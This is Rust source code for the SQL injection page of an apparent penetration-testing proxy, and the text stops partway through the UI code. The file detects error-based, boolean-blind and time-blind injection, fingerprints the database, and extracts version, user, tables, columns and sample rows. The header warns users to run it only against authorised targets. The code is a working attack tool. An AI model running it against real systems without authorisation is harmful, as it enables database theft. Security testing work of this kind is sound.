//! SQLi 页:**sqlmap 式** SQL 注入检测与利用。
//!
//! 选一条请求(可从代理右键「发送到 SQLi」带入)+ 一个注入点,后台按四类技术逐步探测:
//! **报错型 → 布尔盲注 → 时间盲注**(指纹库类型),命中后再 **报错外带 / 联合查询**取数
//! (版本 / 当前用户 / 当前库)。引擎是纯函数 [`scry_sqli`],发包复用 [`scry_proxy::replay`]
//! (与扫描器 / 爆破同一条 async 路径:后台临时 current-thread runtime 串行驱动 + mpsc 流式回填
//! + 前台 120ms 轮询)。
//!
//! ⚠️ 主动注入会向目标发送攻击载荷,**只对你已获授权的目标使用**。

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc::{self, Sender};
use std::sync::Arc;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use mage_ui::prelude::*;
use scry_core::HttpFlow;
use scry_proxy::replay::{self, ReplayConfig, ReplayRequest};
use scry_proxy::upstream::UpstreamProxy;
use scry_sqli::{
    bool_inject, boolean_tests, build_probe, cell_query, char_code_expr, column_name_query,
    columns_count_query, error_extract_value, error_probe_values, injection_points, judge_boolean,
    judge_time_delta, length_expr, match_error_dbms, parse_exfil, rows_count_query, similarity,
    table_name_query, tables_count_query, time_tests, union_inner_value, union_tests, union_value,
    Boundary, Dbms, InjectionPoint, RespView, Scalar, Technique, BOOL_SIM_HIGH, BOUNDARIES,
    UNION_MAX_COLS,
};

use crate::logger::LogLevel;
use crate::repeater::{parse_raw_request, render_raw_request, target_string};
use crate::state::{ScryApp, SqliLevel, SqliLine, SqliMsg, SqliReport, SqliTableDump};
use crate::widgets::{divider, section_label};

/// 自动模式下最多测试的注入点数(参数极多时防止狂发)。
const CANDIDATE_CAP: usize = 12;
/// 时间盲注最多尝试的睡眠请求数(每个会真睡 secs 秒,必须有上限)。
const TIME_BUDGET: usize = 8;
/// 测试日志最多保留行数。
const SQLI_LOG_CAP: usize = 600;
/// 时间盲注睡眠秒数可选项。
const SECS_OPTS: [u32; 4] = [2, 3, 5, 8];

// ── dump / 库表枚举上限(防失控:盲注逐字符开销大)──
/// 最多枚举的表数。
const DUMP_MAX_TABLES: usize = 12;
/// 每表最多枚举的列数。
const DUMP_MAX_COLUMNS: usize = 16;
/// 每表最多 dump 的样本行数。
const DUMP_MAX_ROWS: usize = 5;
/// 每行最多 dump 的列数。
const DUMP_MAX_CELL_COLS: usize = 6;
/// 盲注逐字符提取的字符串长度上限。
const DUMP_MAX_LEN: u32 = 64;
/// 盲注通道的总请求预算(每个二分比较 1 请求;防对目标狂轰)。
const DUMP_BLIND_BUDGET: usize = 4000;

/// dump 取数的上下文(选择最快可用通道:报错 > 联合 > 布尔盲注)。
struct DumpCtx<'a> {
    base_flow: &'a HttpFlow,
    point: &'a InjectionPoint,
    boundary: Boundary,
    dbms: Dbms,
    base_view: &'a RespView,
    cfg: &'a ReplayConfig,
    /// 报错外带可用(技术含报错型且该方言支持)。
    can_error: bool,
    /// 联合查询可用时的 (列数, 可显列)。
    union_cp: Option<(usize, usize)>,
    /// 布尔盲注可用(逐字符提取兜底)。
    can_bool: bool,
}

/// 布尔盲注单次提问:注入 `condition`,响应接近基线(状态码 + 相似度)即判该条件为真。
async fn ask_true(condition: &str, ctx: &DumpCtx<'_>) -> bool {
    let v = bool_inject(&ctx.point.value, ctx.boundary, condition);
    let probe = build_probe(ctx.base_flow, ctx.point, &v);
    match send_probe(&probe, ctx.cfg).await {
        Some(resp) => {
            let rv = RespView::of(&resp);
            rv.status == ctx.base_view.status
                && similarity(&ctx.base_view.body, &rv.body) >= BOOL_SIM_HIGH
        }
        None => false,
    }
}

/// 布尔盲注逐字符提取一个子查询标量(先二分长度,再逐字符二分 ASCII 码)。
async fn blind_extract(
    inner: &str,
    ctx: &DumpCtx<'_>,
    ctrl: &Arc<AtomicBool>,
    budget: &mut usize,
) -> Option<String> {
    let lexpr = length_expr(ctx.dbms, inner);
    let (mut lo, mut hi) = (0u32, DUMP_MAX_LEN);
    while lo < hi {
        if ctrl.load(Ordering::Relaxed) || *budget == 0 {
            return None;
        }
        *budget -= 1;
        let mid = (lo + hi) / 2;
        if ask_true(&format!("{lexpr}>{mid}"), ctx).await {
            lo = mid + 1;
        } else {
            hi = mid;
        }
    }
    let len = lo as usize;
    if len == 0 {
        return Some(String::new());
    }
    let mut out = String::new();
    for pos in 1..=len {
        let cexpr = char_code_expr(ctx.dbms, inner, pos);
        let (mut blo, mut bhi) = (0u32, 255u32);
        while blo < bhi {
            if ctrl.load(Ordering::Relaxed) || *budget == 0 {
                return Some(out);
            }
            *budget -= 1;
            let mid = (blo + bhi) / 2;
            if ask_true(&format!("{cexpr}>{mid}"), ctx).await {
                blo = mid + 1;
            } else {
                bhi = mid;
            }
        }
        if blo == 0 {
            break;
        }
        out.push(blo as u8 as char);
    }
    Some(out)
}

/// 取一个子查询标量的值,自动选最快通道:报错外带 → 联合查询 → 布尔盲注逐字符。
async fn dump_extract(
    inner: &str,
    ctx: &DumpCtx<'_>,
    ctrl: &Arc<AtomicBool>,
    budget: &mut usize,
) -> Option<String> {
    // 1) 报错外带(1 请求最快)。
    if ctx.can_error {
        if let Some(frag) = ctx.dbms.error_extract(inner) {
            let v = format!(
                "{}{} {frag}{}",
                ctx.point.value, ctx.boundary.prefix, ctx.boundary.suffix
            );
            let probe = build_probe(ctx.base_flow, ctx.point, &v);
            if let Some(resp) = send_probe(&probe, ctx.cfg).await {
                if let Some(val) = parse_exfil(&RespView::of(&resp).body) {
                    return Some(val);
                }
            }
        }
    }
    // 2) 联合查询(1 请求)。
    if let Some((cols, pos)) = ctx.union_cp {
        let v = union_inner_value(&ctx.point.value, ctx.boundary, ctx.dbms, inner, cols, pos);
        let probe = build_probe(ctx.base_flow, ctx.point, &v);
        if let Some(resp) = send_probe(&probe, ctx.cfg).await {
            if let Some(val) = parse_exfil(&RespView::of(&resp).body) {
                return Some(val);
            }
        }
    }
    // 3) 布尔盲注逐字符(慢,但通用)。
    if ctx.can_bool {
        return blind_extract(inner, ctx, ctrl, budget).await;
    }
    None
}

/// 解析一个「数量」子查询(COUNT(*))的结果为 usize。
fn parse_count(s: &str) -> usize {
    s.trim().parse::<usize>().unwrap_or(0)
}

// ───────────────────────── 后台 runner ─────────────────────────

fn log_line(tx: &Sender<SqliMsg>, level: SqliLevel, text: impl Into<String>) {
    let _ = tx.send(SqliMsg {
        line: Some(SqliLine {
            level,
            text: text.into(),
        }),
        report: None,
        progress: None,
        done: false,
    });
}

fn log_snap(tx: &Sender<SqliMsg>, r: &SqliReport) {
    let _ = tx.send(SqliMsg {
        line: None,
        report: Some(r.clone()),
        progress: None,
        done: false,
    });
}

fn log_prog(tx: &Sender<SqliMsg>, p: impl Into<String>) {
    let _ = tx.send(SqliMsg {
        line: None,
        report: None,
        progress: Some(p.into()),
        done: false,
    });
}

fn finish(tx: &Sender<SqliMsg>, r: &SqliReport, p: impl Into<String>) {
    let _ = tx.send(SqliMsg {
        line: None,
        report: Some(r.clone()),
        progress: Some(p.into()),
        done: true,
    });
}

/// 由重放请求拼一条「仅请求」的流(供注入点发现 / 变异)。
fn flow_from_req(r: &ReplayRequest) -> HttpFlow {
    HttpFlow::request(
        &r.method,
        &r.scheme,
        r.host.clone(),
        r.port,
        r.path.clone(),
        r.headers.clone(),
        r.body.clone(),
    )
}

fn scalar_zh(s: Scalar) -> &'static str {
    match s {
        Scalar::Version => "版本",
        Scalar::User => "当前用户",
        Scalar::Database => "当前库",
    }
}

fn set_scalar(r: &mut SqliReport, s: Scalar, v: String) {
    match s {
        Scalar::Version => r.version = Some(v),
        Scalar::User => r.user = Some(v),
        Scalar::Database => r.database = Some(v),
    }
}

fn has_scalar(r: &SqliReport, s: Scalar) -> bool {
    match s {
        Scalar::Version => r.version.is_some(),
        Scalar::User => r.user.is_some(),
        Scalar::Database => r.database.is_some(),
    }
}

fn push_tech(r: &mut SqliReport, tech: Technique) {
    if !r.techniques.contains(&tech) {
        r.techniques.push(tech);
    }
}

/// 发一条变异探测请求,拿回响应流(失败 = `None`)。
async fn send_probe(probe: &HttpFlow, cfg: &ReplayConfig) -> Option<HttpFlow> {
    replay::send(&ReplayRequest::from_flow(probe), cfg).await.ok()
}

fn truncate(s: &str, n: usize) -> String {
    if s.chars().count() <= n {
        s.to_string()
    } else {
        let t: String = s.chars().take(n).collect();
        format!("{t}…")
    }
}

/// 整条 SQLi 测试流程(检测 → 指纹 → 取数);全程经 `tx` 流式回传日志 / 报告 / 进度。
#[allow(clippy::too_many_arguments)]
async fn run_sqli(
    mut base_req: ReplayRequest,
    points: Vec<InjectionPoint>,
    secs: u32,
    dump: bool,
    session: Option<crate::session::SessionPlan>,
    upstream: Option<UpstreamProxy>,
    ctrl: Arc<AtomicBool>,
    tx: Sender<SqliMsg>,
) {
    let cfg = ReplayConfig {
        upstream,
        ..Default::default()
    };

    // 会话处理:开扫前跑登录宏建立会话并注入到基准请求(所有探测变异都会带上)。
    if let Some(plan) = session {
        log_line(&tx, SqliLevel::Info, "运行登录宏建立会话…");
        match crate::session::run_login_macro(&plan).await {
            Ok((status, st)) => {
                log_line(
                    &tx,
                    if st.is_empty() {
                        SqliLevel::Warn
                    } else {
                        SqliLevel::Good
                    },
                    format!("会话已建立(HTTP {status}):{}", st.summary()),
                );
                let (h, b) =
                    crate::session::apply_session_to(&base_req.headers, &base_req.body, &st, &plan.apply);
                base_req.headers = h;
                base_req.body = b;
            }
            Err(e) => log_line(&tx, SqliLevel::Warn, format!("登录宏失败:{e}")),
        }
    }

    let base_flow = flow_from_req(&base_req);
    let mut report = SqliReport::default();

    // 基线:发送原始请求,作为布尔盲注的对照与时间盲注的基准耗时。
    log_line(&tx, SqliLevel::Info, "建立基线:发送原始请求…");
    let baseline = match replay::send(&base_req, &cfg).await {
        Ok(f) => f,
        Err(e) => {
            finish(&tx, &report, format!("基线请求失败:{e:#}"));
            return;
        }
    };
    let base_view = RespView::of(&baseline);
    let baseline_ms = baseline.duration_ms;
    log_line(
        &tx,
        SqliLevel::Info,
        format!(
            "基线:HTTP {} · {} 字节 · {} ms",
            base_view.status,
            base_view.body.len(),
            baseline_ms
        ),
    );
    // 基线本身含数据库报错字样 → 报错型判定不可靠,跳过它(只靠盲注 / 联合)。
    let baseline_has_db_error = match_error_dbms(&base_view.body).is_some();
    if baseline_has_db_error {
        log_line(
            &tx,
            SqliLevel::Warn,
            "基线响应本身含数据库报错字样 → 跳过报错型判定(避免误报)",
        );
    }

    let nonce = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or(1337);

    for (pi, point) in points.iter().enumerate() {
        if ctrl.load(Ordering::Relaxed) {
            finish(&tx, &report, "已停止");
            return;
        }
        log_prog(&tx, format!("测试注入点 {}/{}", pi + 1, points.len()));
        log_line(
            &tx,
            SqliLevel::Info,
            format!("▶ 注入点 [{}] 原值「{}」", point.label(), truncate(&point.value, 40)),
        );

        // 1) 报错型:逐个追加语法破坏字符,看响应是否冒出数据库报错。
        if !baseline_has_db_error {
            for v in error_probe_values(&point.value) {
                if ctrl.load(Ordering::Relaxed) {
                    finish(&tx, &report, "已停止");
                    return;
                }
                let probe = build_probe(&base_flow, point, &v);
                let Some(resp) = send_probe(&probe, &cfg).await else {
                    continue;
                };
                if let Some(db) = match_error_dbms(&RespView::of(&resp).body) {
                    report.injectable = true;
                    report.point = Some(point.clone());
                    report.dbms = Some(db);
                    push_tech(&mut report, Technique::Error);
                    log_line(
                        &tx,
                        SqliLevel::Good,
                        format!("✓ 报错型注入!载荷「{v}」触发 {} 报错回显", db.label()),
                    );
                    log_snap(&tx, &report);
                    break;
                }
            }
        }

        // 2) 布尔盲注:恒真 / 恒假条件下响应是否可区分。
        if !ctrl.load(Ordering::Relaxed) {
            for bt in boolean_tests(&point.value, nonce) {
                if ctrl.load(Ordering::Relaxed) {
                    finish(&tx, &report, "已停止");
                    return;
                }
                let tp = build_probe(&base_flow, point, &bt.truthy);
                let fp = build_probe(&base_flow, point, &bt.falsy);
                let (Some(tr), Some(fr)) =
                    (send_probe(&tp, &cfg).await, send_probe(&fp, &cfg).await)
                else {
                    continue;
                };
                if judge_boolean(&base_view, &RespView::of(&tr), &RespView::of(&fr)) {
                    report.injectable = true;
                    report.point = Some(point.clone());
                    report.boundary = Some(bt.boundary);
                    push_tech(&mut report, Technique::Boolean);
                    log_line(
                        &tx,
                        SqliLevel::Good,
                        format!("✓ 布尔盲注!边界「{}」可区分真 / 假响应", bt.boundary.label()),
                    );
                    log_snap(&tx, &report);
                    break;
                }
            }
        }

        // 3) 时间盲注:尚未指纹出库类型时兜底(也用于确认)。预算有限(每次真睡 secs 秒)。
        if report.dbms.is_none() && !ctrl.load(Ordering::Relaxed) {
            let mut budget = TIME_BUDGET;
            for tt in time_tests(&point.value, secs) {
                if budget == 0 {
                    break;
                }
                if ctrl.load(Ordering::Relaxed) {
                    finish(&tx, &report, "已停止");
                    return;
                }
                // 已知边界则只试该边界,省请求。
                if let Some(b) = report.boundary {
                    if tt.boundary != b {
                        continue;
                    }
                }
                budget -= 1;
                let probe = build_probe(&base_flow, point, &tt.value);
                let Some(resp) = send_probe(&probe, &cfg).await else {
                    continue;
                };
                if judge_time_delta(secs, baseline_ms, resp.duration_ms) {
                    // 二次确认抗网络抖动。
                    let probe2 = build_probe(&base_flow, point, &tt.value);
                    if let Some(resp2) = send_probe(&probe2, &cfg).await {
                        if judge_time_delta(secs, baseline_ms, resp2.duration_ms) {
                            report.injectable = true;
                            report.point = Some(point.clone());
                            report.dbms = Some(tt.dbms);
                            report.boundary.get_or_insert(tt.boundary);
                            push_tech(&mut report, Technique::Time);
                            log_line(
                                &tx,
                                SqliLevel::Good,
                                format!("✓ 时间盲注!{} 延迟≈{secs}s(载荷使数据库睡眠)", tt.dbms.label()),
                            );
                            log_snap(&tx, &report);
                            break;
                        }
                    }
                }
            }
        }

        if report.injectable {
            log_line(
                &tx,
                SqliLevel::Good,
                format!("注入点 [{}] 可注入,停止测试其它点", point.label()),
            );
            break;
        }
        log_line(
            &tx,
            SqliLevel::Info,
            format!("注入点 [{}] 未发现注入", point.label()),
        );
    }

    if !report.injectable {
        finish(&tx, &report, "完成:未发现 SQL 注入");
        return;
    }

    // 盲注成立但未指纹库类型:用布尔通道做一次轻量方言指纹(各方言当前库函数互不相同,
    // 错误方言的函数会触发 SQL 错误使页面偏离基线 → 只有正确方言判真)。
    if report.dbms.is_none()
        && report.techniques.contains(&Technique::Boolean)
        && !ctrl.load(Ordering::Relaxed)
    {
        let point = report.point.clone().unwrap();
        let boundary = report.boundary.unwrap_or(BOUNDARIES[0]);
        for d in Dbms::ALL {
            if ctrl.load(Ordering::Relaxed) {
                break;
            }
            let cond = format!("{}>=0", length_expr(d, d.scalar(Scalar::Database)));
            let v = bool_inject(&point.value, boundary, &cond);
            let probe = build_probe(&base_flow, &point, &v);
            if let Some(resp) = send_probe(&probe, &cfg).await {
                let rv = RespView::of(&resp);
                if rv.status == base_view.status
                    && similarity(&base_view.body, &rv.body) >= BOOL_SIM_HIGH
                {
                    report.dbms = Some(d);
                    push_tech(&mut report, Technique::Boolean);
                    log_line(&tx, SqliLevel::Good, format!("盲注方言指纹:{}", d.label()));
                    log_snap(&tx, &report);
                    break;
                }
            }
        }
    }

    // ── 取数(需先指纹出库类型)──
    let Some(dbms) = report.dbms else {
        log_line(
            &tx,
            SqliLevel::Warn,
            "已确认可注入,但布尔盲注无回显、未能指纹数据库 → 跳过取数",
        );
        finish(&tx, &report, "完成:发现注入(盲注,未取数)");
        return;
    };
    let point = report.point.clone().unwrap();
    let boundary = report.boundary.unwrap_or(BOUNDARIES[0]);
    log_line(
        &tx,
        SqliLevel::Info,
        format!("数据库指纹:{} · 开始取数(版本 / 用户 / 库)", dbms.label()),
    );
    log_prog(&tx, "取数中…");

    // a) 报错型外带(每标量 1 请求,最快)。
    for s in Scalar::ALL {
        if ctrl.load(Ordering::Relaxed) {
            break;
        }
        if has_scalar(&report, s) {
            continue;
        }
        let Some(v) = error_extract_value(&point.value, boundary, dbms, s) else {
            continue;
        };
        let probe = build_probe(&base_flow, &point, &v);
        let Some(resp) = send_probe(&probe, &cfg).await else {
            continue;
        };
        if let Some(val) = parse_exfil(&RespView::of(&resp).body) {
            set_scalar(&mut report, s, val.clone());
            push_tech(&mut report, Technique::Error);
            log_line(&tx, SqliLevel::Good, format!("✓ {} = {val}", scalar_zh(s)));
            log_snap(&tx, &report);
        }
    }

    // b) 联合查询兜底(报错没拿到的 / SQLite):先探出列数与可显列,再按它逐标量取数。
    // `union_cp` 提到 dump 阶段也复用(联合查询是取数快通道)。
    let mut union_cp: Option<(usize, usize)> = None;
    let missing_any = Scalar::ALL.into_iter().any(|s| !has_scalar(&report, s));
    if missing_any && !ctrl.load(Ordering::Relaxed) {
        log_line(&tx, SqliLevel::Info, "尝试联合查询取数(探测列数与可显列)…");
        let mut cols_pos: Option<(usize, usize)> = None;
        for ut in union_tests(&point.value, boundary, dbms, Scalar::Version, UNION_MAX_COLS) {
            if ctrl.load(Ordering::Relaxed) {
                break;
            }
            let probe = build_probe(&base_flow, &point, &ut.value);
            let Some(resp) = send_probe(&probe, &cfg).await else {
                continue;
            };
            if let Some(val) = parse_exfil(&RespView::of(&resp).body) {
                cols_pos = Some((ut.cols, ut.pos));
                push_tech(&mut report, Technique::Union);
                log_line(
                    &tx,
                    SqliLevel::Good,
                    format!("✓ 联合查询成立:{} 列,可显列 #{}", ut.cols, ut.pos + 1),
                );
                if !has_scalar(&report, Scalar::Version) {
                    set_scalar(&mut report, Scalar::Version, val.clone());
                    log_line(
                        &tx,
                        SqliLevel::Good,
                        format!("✓ {} = {val}", scalar_zh(Scalar::Version)),
                    );
                }
                log_snap(&tx, &report);
                break;
            }
        }
        if let Some((cols, pos)) = cols_pos {
            for s in Scalar::ALL {
                if has_scalar(&report, s) || ctrl.load(Ordering::Relaxed) {
                    continue;
                }
                let v = union_value(&point.value, boundary, dbms, s, cols, pos);
                let probe = build_probe(&base_flow, &point, &v);
                let Some(resp) = send_probe(&probe, &cfg).await else {
                    continue;
                };
                if let Some(val) = parse_exfil(&RespView::of(&resp).body) {
                    set_scalar(&mut report, s, val.clone());
                    log_line(&tx, SqliLevel::Good, format!("✓ {} = {val}", scalar_zh(s)));
                    log_snap(&tx, &report);
                }
            }
        } else {
            log_line(
                &tx,
                SqliLevel::Warn,
                "联合查询未取到数据(列数 / 类型不匹配或被过滤)",
            );
        }
        union_cp = cols_pos;
    }

    // ── c) dump:库表枚举 + 样本数据(sqlmap 式;自动选最快通道,盲注有预算上限)──
    if dump && !ctrl.load(Ordering::Relaxed) {
        let can_error =
            report.techniques.contains(&Technique::Error) && dbms.error_extract("1").is_some();
        let can_bool = report.techniques.contains(&Technique::Boolean);
        if !can_error && union_cp.is_none() && !can_bool {
            log_line(
                &tx,
                SqliLevel::Warn,
                "仅时间盲注通道,逐字符取数过慢 → 跳过库表枚举",
            );
        } else {
            let ctx = DumpCtx {
                base_flow: &base_flow,
                point: &point,
                boundary,
                dbms,
                base_view: &base_view,
                cfg: &cfg,
                can_error,
                union_cp,
                can_bool,
            };
            let mut budget = DUMP_BLIND_BUDGET;
            log_line(&tx, SqliLevel::Info, "开始库表枚举 + 取数…");
            log_prog(&tx, "枚举库表…");

            let tcount = dump_extract(&tables_count_query(dbms), &ctx, &ctrl, &mut budget)
                .await
                .map(|s| parse_count(&s));
            match tcount {
                Some(tc) if tc > 0 => {
                    log_line(&tx, SqliLevel::Good, format!("当前库有 {tc} 张表"));
                    let n = tc.min(DUMP_MAX_TABLES);
                    for ti in 0..n {
                        if ctrl.load(Ordering::Relaxed) {
                            break;
                        }
                        let Some(tname) =
                            dump_extract(&table_name_query(dbms, ti), &ctx, &ctrl, &mut budget).await
                        else {
                            continue;
                        };
                        if tname.is_empty() {
                            continue;
                        }
                        log_prog(&tx, format!("枚举表 {}/{n}:{tname}", ti + 1));
                        log_line(&tx, SqliLevel::Good, format!("表 [{}] {tname}", ti + 1));
                        let mut td = SqliTableDump {
                            name: tname.clone(),
                            ..Default::default()
                        };
                        // 列。
                        if let Some(cc) =
                            dump_extract(&columns_count_query(dbms, &tname), &ctx, &ctrl, &mut budget)
                                .await
                                .map(|s| parse_count(&s))
                        {
                            let cn = cc.min(DUMP_MAX_COLUMNS);
                            for ci in 0..cn {
                                if ctrl.load(Ordering::Relaxed) {
                                    break;
                                }
                                if let Some(col) = dump_extract(
                                    &column_name_query(dbms, &tname, ci),
                                    &ctx,
                                    &ctrl,
                                    &mut budget,
                                )
                                .await
                                {
                                    if !col.is_empty() {
                                        td.columns.push(col);
                                    }
                                }
                            }
                        }
                        if !td.columns.is_empty() {
                            log_line(&tx, SqliLevel::Info, format!("  列:{}", td.columns.join(", ")));
                        }
                        // 样本行:仅快通道(报错 / 联合);盲注逐字符取整行开销过大,跳过。
                        if can_error || union_cp.is_some() {
                            if let Some(rc) =
                                dump_extract(&rows_count_query(dbms, &tname), &ctx, &ctrl, &mut budget)
                                    .await
                                    .map(|s| parse_count(&s))
                            {
                                td.row_count = Some(rc);
                                let rn = rc.min(DUMP_MAX_ROWS);
                                let cols: Vec<String> =
                                    td.columns.iter().take(DUMP_MAX_CELL_COLS).cloned().collect();
                                for ri in 0..rn {
                                    if ctrl.load(Ordering::Relaxed) {
                                        break;
                                    }
                                    let mut row = Vec::new();
                                    for col in &cols {
                                        let cell = dump_extract(
                                            &cell_query(dbms, &tname, col, ri),
                                            &ctx,
                                            &ctrl,
                                            &mut budget,
                                        )
                                        .await
                                        .unwrap_or_default();
                                        row.push(cell);
                                    }
                                    td.rows.push(row);
                                }
                                if !td.rows.is_empty() {
                                    log_line(
                                        &tx,
                                        SqliLevel::Good,
                                        format!("  dump 了 {} 行样本", td.rows.len()),
                                    );
                                }
                            }
                        }
                        report.tables.push(td);
                        log_snap(&tx, &report);
                    }
                }
                Some(_) => log_line(&tx, SqliLevel::Warn, "当前库表数为 0 / 未取到"),
                None => log_line(&tx, SqliLevel::Warn, "未能枚举库表(通道取数失败)"),
            }
        }
    }

    finish(&tx, &report, "完成");
}

// ───────────────────────── UI + 控制 ─────────────────────────

impl ScryApp {
    /// 从一条流带入 SQLi 测试(代理右键「发送到 SQLi」)。
    pub fn fill_sqli_from_flow(&mut self, flow: &HttpFlow, cx: &mut Context<Self>) {
        let target = target_string(flow);
        let raw = render_raw_request(flow);
        self.sqli_target.update(cx, |s, cx| s.set_text(target, cx));
        self.sqli_req.update(cx, |s, cx| s.set_text(raw, cx));
        self.sqli_point_sel = 0;
        self.sqli_report = SqliReport::default();
        self.sqli_log.clear();
        self.sqli_progress = None;
    }

    /// 当前请求文本解析出的注入点(供下拉显示);解析失败返回空。
    pub(crate) fn sqli_points(&self, cx: &Context<Self>) -> Vec<InjectionPoint> {
        let target = self.sqli_target.read(cx).text().to_string();
        let raw = self.sqli_req.read(cx).text().to_string();
        match parse_raw_request(&target, &raw) {
            Ok(r) => injection_points(&flow_from_req(&r)),
            Err(_) => Vec::new(),
        }
    }

    pub fn set_sqli_point(&mut self, idx: usize, cx: &mut Context<Self>) {
        self.sqli_point_sel = idx;
        self.sqli_point_open = false;
        cx.notify();
    }

    pub fn set_sqli_secs(&mut self, idx: usize, cx: &mut Context<Self>) {
        self.sqli_secs = SECS_OPTS.get(idx).copied().unwrap_or(3);
        self.sqli_secs_open = false;
        cx.notify();
    }

    /// 停止测试(置停止位 + 丢弃接收端)。
    pub fn stop_sqli(&mut self, cx: &mut Context<Self>) {
        if let Some(c) = &self.sqli_ctrl {
            c.store(true, Ordering::Relaxed);
        }
        self.sqli_busy = false;
        self.sqli_rx = None;
        self.sqli_ctrl = None;
        self.sqli_progress = Some(self.lang.t("Stopped").to_string());
        self.push_log(LogLevel::Warning, "sqli", "SQL 注入测试已停止");
        cx.notify();
    }

    /// 开始 SQL 注入测试:解析请求 → 取注入点 → 后台 runner 串行探测 + 流式回填。
    pub fn start_sqli(&mut self, cx: &mut Context<Self>) {
        if self.sqli_busy {
            return;
        }
        let target = self.sqli_target.read(cx).text().to_string();
        let raw = self.sqli_req.read(cx).text().to_string();
        let base_req = match parse_raw_request(&target, &raw) {
            Ok(r) => r,
            Err(e) => {
                let msg = format!("请求解析失败:{e}");
                self.sqli_log = vec![SqliLine {
                    level: SqliLevel::Bad,
                    text: msg.clone(),
                }];
                self.sqli_progress = Some(msg);
                cx.notify();
                return;
            }
        };
        let base_flow = flow_from_req(&base_req);
        let all_points = injection_points(&base_flow);
        if all_points.is_empty() {
            let msg = "无注入点(请求需带查询参数或表单字段)".to_string();
            self.sqli_log = vec![SqliLine {
                level: SqliLevel::Warn,
                text: msg.clone(),
            }];
            self.sqli_progress = Some(msg);
            cx.notify();
            return;
        }
        let points: Vec<InjectionPoint> = if self.sqli_point_sel == 0 {
            all_points.into_iter().take(CANDIDATE_CAP).collect()
        } else {
            match all_points.get(self.sqli_point_sel - 1) {
                Some(p) => vec![p.clone()],
                None => all_points.into_iter().take(CANDIDATE_CAP).collect(),
            }
        };
        let secs = self.sqli_secs;
        let dump = self.sqli_dump;
        let session = self.session_plan(cx);
        let up = self.upstream_proxy(cx);

        self.sqli_busy = true;
        self.sqli_report = SqliReport::default();
        self.sqli_log = vec![SqliLine {
            level: SqliLevel::Info,
            text: format!(
                "开始 SQL 注入测试 · {} 个候选注入点 · 时间盲注 {secs}s",
                points.len()
            ),
        }];
        self.sqli_progress = Some("准备中…".to_string());
        let ctrl = Arc::new(AtomicBool::new(false));
        self.sqli_ctrl = Some(ctrl.clone());
        let (tx, rx) = mpsc::channel::<SqliMsg>();
        self.sqli_rx = Some(rx);
        self.push_log(
            LogLevel::Info,
            "sqli",
            format!("SQL 注入测试开始 · {} · {} 注入点", base_req.host, points.len()),
        );
        cx.notify();

        // 后台:临时 current-thread runtime 串行驱动整条注入流程。
        cx.background_executor()
            .spawn(async move {
                let rt = match tokio::runtime::Builder::new_current_thread()
                    .enable_all()
                    .build()
                {
                    Ok(rt) => rt,
                    Err(_) => return,
                };
                rt.block_on(run_sqli(base_req, points, secs, dump, session, up, ctrl, tx));
            })
            .detach();

        // 前台轮询:把日志 / 报告 / 进度并入状态,结束即收尾。
        cx.spawn(async move |this, cx| {
            loop {
                cx.background_executor()
                    .timer(Duration::from_millis(120))
                    .await;
                let keep = this.update(cx, |this, cx| {
                    this.drain_sqli();
                    cx.notify();
                    this.sqli_busy
                });
                match keep {
                    Ok(true) => continue,
                    _ => break,
                }
            }
        })
        .detach();
    }

    /// 排空通道:并入日志 / 报告 / 进度;结束则收尾。
    fn drain_sqli(&mut self) {
        let Some(rx) = &self.sqli_rx else {
            return;
        };
        let mut done = false;
        while let Ok(msg) = rx.try_recv() {
            if let Some(l) = msg.line {
                self.sqli_log.push(l);
            }
            if let Some(r) = msg.report {
                self.sqli_report = r;
            }
            if let Some(p) = msg.progress {
                self.sqli_progress = Some(p);
            }
            if msg.done {
                done = true;
            }
        }
        if self.sqli_log.len() > SQLI_LOG_CAP {
            let cut = self.sqli_log.len() - SQLI_LOG_CAP;
            self.sqli_log.drain(0..cut);
        }
        if done {
            self.sqli_busy = false;
            self.sqli_rx = None;
            self.sqli_ctrl = None;
            if self.sqli_report.injectable {
                self.push_log(
                    LogLevel::Success,
                    "sqli",
                    format!(
                        "SQL 注入确认 · {} 种技术成立",
                        self.sqli_report.techniques.len()
                    ),
                );
            } else {
                self.push_log(LogLevel::Info, "sqli", "SQL 注入测试完成 · 未发现注入");
            }
        }
    }

    /// SQLi 页主体。
    pub fn sqli_content(&self, cx: &mut Context<Self>) -> impl IntoElement {
        let c = cx.theme().colors;
        let t = cx.theme().tokens;

        // 注入点下拉:第 0 项「全部参数(自动)」,其余为解析出的各注入点。
        let points = self.sqli_points(cx);
        let mut point_opts: Vec<SharedString> = vec![self.lang.t("All parameters (auto)")];
        point_opts.extend(points.iter().map(|p| SharedString::from(p.label())));
        let point_idx = self.sqli_point_sel.min(point_opts.len().saturating_sub(1));
        let view_p = cx.entity();
        let view_ps = cx.entity();
        let point_select = Select::new("sqli-point", point_opts, point_idx)
            .width(px(260.0))
            .open(self.sqli_point_open)
            .on_toggle(move |_e, _w, app| {
                view_p.update(app, |this, cx| {
                    this.sqli_point_open = !this.sqli_point_open;
                    cx.notify();
                });
            })
            .on_select(move |i, _e, _w, app| {
                view_ps.update(app, |this, cx| this.set_sqli_point(i, cx));
            });

        // 时间盲注睡眠秒数下拉。
        let secs_opts: Vec<SharedString> = SECS_OPTS
            .iter()
            .map(|s| SharedString::from(format!("{s}s")))
            .collect();
        let secs_idx = SECS_OPTS.iter().position(|s| *s == self.sqli_secs).unwrap_or(1);
        let view_s = cx.entity();
        let view_ss = cx.entity();
        let secs_select = Select::new("sqli-secs", secs_opts, secs_idx)
            .width(px(90.0))
            .open(self.sqli_secs_open)
            .on_toggle(move |_e, _w, app| {
                view_s.update(app, |this, cx| {
                    this.sqli_secs_open = !this.sqli_secs_open;
                    cx.notify();
                });
            })
            .on_select(move |i, _e, _w, app| {
                view_ss.update(app, |this, cx| this.set_sqli_secs(i, cx));
            });

        let action = if self.sqli_busy {
            Button::new("sqli-stop", self.lang.t("Stop"))
                .variant(ButtonVariant::Danger)
                .size(ButtonSize::Sm)
                .icon(IconName::Box)
                .on_click(cx.listener(|this, _e, _w, cx| this.stop_sqli(cx)))
        } else {
            Button::new("sqli-start", self.lang.t("Start test"))
                .variant(ButtonVariant::Danger)
                .size(ButtonSize::Sm)
                .icon(IconName::Zap)
                .on_click(cx.listener(|this, _e, _w, cx| this.start_sqli(cx)))
        };

        let mut toolbar = div()
            .flex()
            .items_center()
            .gap(t.space.md)
            .flex_shrink_0()
            .child(
                div()
